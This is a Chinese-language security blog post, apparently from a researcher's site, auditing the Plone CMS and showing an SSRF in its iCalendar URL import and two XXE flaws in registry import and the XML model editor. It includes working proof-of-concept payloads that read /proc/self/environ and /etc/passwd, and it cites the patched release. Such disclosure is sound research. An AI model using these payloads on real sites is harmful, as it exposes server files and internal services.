@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>代码审计--Plone ~ Misaki&#39;s Blog</title>
+    <link rel="stylesheet" href="/css/Material_Icons.css">
+    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+    
+        <link rel="stylesheet" href="/css/post.css">
+        
+            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+        
+    
+</head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">代码审计--Plone</h1>
+        <p class="text-center"><b>Wednesday, November 18th 2020, 9:32 am</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <h2 id="Plone"><a href="#Plone" class="headerlink" title="Plone"></a>Plone</h2><p>Plone是使用Python开发的一个开源的内容管理系统，安装的时候以第三方包的形式安装使用，三百个包左右的程序，这个查看起来查找对应功能实在是费劲。</p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p><code>plone.app.event-3.2.7-py3.6.egg\plone\app\event\ical\importer.py</code></p>
+<pre><code>@button.buttonAndHandler(u&#39;Save and Import&#39;)
+    def handleSaveImport(self, action):
+        data, errors = self.extractData()
+        if errors:
+            return False
+
+        self.save_data(data)
+
+        ical_file = data[&#39;ical_file&#39;]
+        ical_url = data[&#39;ical_url&#39;]
+        event_type = data[&#39;event_type&#39;]
+        sync_strategy = data[&#39;sync_strategy&#39;]
+
+        if ical_file or ical_url:
+
+            if ical_file:
+                # File upload is not saved in settings
+                ical_resource = ical_file.data
+                ical_import_from = ical_file.filename
+            else:
+                ical_resource = urllib.request.urlopen(ical_url).read()
+                ical_import_from = ical_url
+
+            import_metadata = ical_import(
+                self.context,
+                ics_resource=ical_resource,
+                event_type=event_type,
+                sync_strategy=sync_strategy,
+            )
+</code></pre><p>如上所述，在读取参数<code>ical_url</code>时，根据程序设置是导入该事件的<code>icalendar</code>资源文件，但对如何读取资源文件没有限制，可以直接使用urllib包进行读取和返回</p>
+<p>在Members功能下的<code>Action</code>中选择<code>Enable icalendar import</code>后，配置<code>Icalendar URL</code>参数。</p>
+<p>参数：<code>http://127.0.0.1:22</code>，执行<code>Save and Import</code>。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109094919974.png" alt="image-20201109094919974"></p>
+<p>urllib还支持文件协议，因此也可以用于文件读取</p>
+<p>参数: <code>file:///proc/self/environ</code></p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109100807462.png" alt="image-20201109100807462"></p>
+<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\browser\records.py</code></p>
+<pre><code>def import_registry(self):
+        try:
+            fi = self.request.form[&#39;file&#39;]
+            body = fi.read()
+        except (AttributeError, KeyError):
+            messages = IStatusMessage(self.request)
+            messages.add(u&quot;Must provide XML file&quot;, type=u&quot;error&quot;)
+            body = None
+        if body is not None:
+            importer = RegistryImporter(self.context, FakeEnv())
+            try:
+                importer.importDocument(body)
+            except XMLSyntaxError:
+                messages = IStatusMessage(self.request)
+                messages.add(u&quot;Must provide valid XML file&quot;, type=u&quot;error&quot;)
+        return self.request.response.redirect(self.context.absolute_url())
+</code></pre><p>注意<code>importDocument</code>方法，该方法在lxml.etree下调用该方法</p>
+<p><code>plone.app.registry-1.7.6-py3.6.egg\plone\app\registry\exportimport\handler.py</code></p>
+<pre><code>class RegistryImporter(object):
+    &quot;&quot;&quot;Helper classt to import a registry file
+    &quot;&quot;&quot;
+
+    LOGGER_ID = &#39;plone.app.registry&#39;
+
+    def __init__(self, context, environ):
+        self.context = context
+        self.environ = environ
+        self.logger = environ.getLogger(self.LOGGER_ID)
+
+    def importDocument(self, document):
+        tree = etree.fromstring(document)
+
+        if self.environ.shouldPurge():
+            self.context.records.clear()
+
+        i18n_domain = tree.attrib.get(ns(&#39;domain&#39;, I18N_NAMESPACE))
+        if i18n_domain:
+            parseinfo.i18n_domain = i18n_domain
+
+        for node in tree:
+            if not isinstance(node.tag, str):
+                continue
+            condition = node.attrib.get(&#39;condition&#39;, None)
+            if condition and not evaluateCondition(condition):
+                continue
+            if node.tag.lower() == &#39;record&#39;:
+                self.importRecord(node)
+            elif node.tag.lower() == &#39;records&#39;:
+                self.importRecords(node)
+
+        parseinfo.i18n_domain = None
+</code></pre><p>此方法是此XXE的原因。 在网站设置<code>Site Setup</code>下的<code>Configuration Registry</code>中导出合适的XML文件。 在这里，选择了<code>plone.thumb_scale_table.xml</code>前缀文件。</p>
+<p>参数 POC：</p>
+<pre><code>&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;
+&lt;!DOCTYPE value [
+&lt;!ELEMENT value ANY &gt;
+&lt;!ENTITY title SYSTEM &quot;file:///etc/passwd&quot; &gt; 
+]&gt;
+&lt;registry&gt;
+  &lt;records interface=&quot;Products.CMFPlone.interfaces.controlpanel.ISiteSchema&quot; prefix=&quot;plone&quot;&gt;
+    &lt;value key=&quot;thumb_scale_table&quot;&gt;&amp;title;&lt;/value&gt;
+  &lt;/records&gt;
+&lt;/registry&gt;
+</code></pre><p>执行后，您可以在错误报告中看到已解析的XML实体。<img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201109142113406.png" alt="image-20201109142113406"></p>
+<h3 id="XXE-2"><a href="#XXE-2" class="headerlink" title="XXE-2"></a>XXE-2</h3><p><code>plone.app.dexterity-2.6.5-py3.6.egg\plone\app\dexterity\browser\modeleditor.py</code></p>
+<pre><code>class AjaxSaveHandler(BrowserView):
+    &quot;&quot;&quot;Handle AJAX save posts.
+    &quot;&quot;&quot;
+
+    def __call__(self):
+        &quot;&quot;&quot;Handle AJAX save post.
+        &quot;&quot;&quot;
+
+        if not authorized(self.context, self.request):
+            raise Unauthorized
+
+        source = self.request.form.get(&#39;source&#39;)
+        if source:
+            # Is it valid XML?
+            try:
+                root = etree.fromstring(source)
+            except etree.XMLSyntaxError as e:
+                return json.dumps({
+                    &#39;success&#39;: False,
+                    &#39;message&#39;: &#39;XMLSyntaxError: {0}&#39;.format(
+                        safe_unicode(e.args[0])
+                    )
+                })
+
+            # a little more sanity checking, look at first two element levels
+            if root.tag != NAMESPACE + &#39;model&#39;:
+                return json.dumps({
+                    &#39;success&#39;: False,
+                    &#39;message&#39;: _(u&quot;Error: root tag must be &#39;model&#39;&quot;)
+                })
+            for element in root.getchildren():
+                if element.tag != NAMESPACE + &#39;schema&#39;:
+                    return json.dumps({
+                        &#39;success&#39;: False,
+                        &#39;message&#39;: _(
+                            u&quot;Error: all model elements must be &#39;schema&#39;&quot;
+                        )
+                    })
+
+            # can supermodel parse it?
+            # This is mainly good for catching bad dotted names.
+            try:
+                plone.supermodel.loadString(source, policy=u&#39;dexterity&#39;)
+            except SupermodelParseError as e:
+                message = e.args[0].replace(&#39;\n  File &quot;&lt;unknown&gt;&quot;&#39;, &#39;&#39;)
+                return json.dumps({
+                    &#39;success&#39;: False,
+                    &#39;message&#39;: u&#39;SuperModelParseError: {0}&#39;.format(message)
+                })
+
+</code></pre><p>上面的代码使用lxml库，但是直接解析xml中的外部参数。 结果，在功能 <code>Dexterity Content Types</code>下选择<code>custom content types</code>，然后单击进入。 <code>fields</code>标签下的<code>Edit XML Field Model</code>可以直接编写xml代码。</p>
+<p>参数 POC：</p>
+<pre><code>&lt;!DOCTYPE value [&lt;!ELEMENT value ANY &gt;&lt;!ENTITY title SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;
+&lt;model xmlns:i18n=&quot;http://xml.zope.org/namespaces/i18n&quot; xmlns:marshal=&quot;http://namespaces.plone.org/supermodel/marshal&quot; xmlns:form=&quot;http://namespaces.plone.org/supermodel/form&quot; xmlns:security=&quot;http://namespaces.plone.org/supermodel/security&quot; xmlns:users=&quot;http://namespaces.plone.org/supermodel/users&quot; xmlns:lingua=&quot;http://namespaces.plone.org/supermodel/lingua&quot; xmlns=&quot;http://namespaces.plone.org/supermodel/schema&quot;&gt;
+ &amp;title;&lt;schema/&gt;
+&lt;/model&gt;
+</code></pre><p>因为程序代码中似乎存在问题，所以无法添加XML声明文件，但是打开的默认声明文件具有添加的声明文件。 需要删除。 保存参数，并在返回后单击此处查看它们。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20201110100900815.png" alt="image-20201110100900815"></p>
+<p>问题相对利用条件较高，需要管理员权限，其后官方推出了更新版本5.2.3：<a href="https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt" target="_blank" rel="noopener">https://dist.plone.org/release/5.2.3-pending/RELEASE-NOTES.txt</a></p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="">Misaki</a>
+                    <p>原文链接：<a href="/2020/11/代码审计-Plone/">/2020/11/代码审计-Plone/</a>
+                    <p>发表日期：<a href="/2020/11/代码审计-Plone/">November 18th 2020, 9:32:02 am</a>
+                    <p>更新日期：<a href="/2020/11/代码审计-Plone/">November 18th 2020, 9:35:28 am</a>
+                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;web安全</span>
+                      &nbsp;
+                       
+                      <span class="badge badge-default">#&nbsp;python</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = '/2020/11/代码审计-Plone/'; 
+            this.page.identifier = '/2020/11/代码审计-Plone/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/core/popper.min.js"></script>
+      <script src="/js/core/bootstrap-material-design.min.js"></script>
+      <script src="/js/plugins/moment.min.js"></script>
+      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        <script src="/js/post.js"></script>
+        <script src="/js/plugins/prettify.js"></script>
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
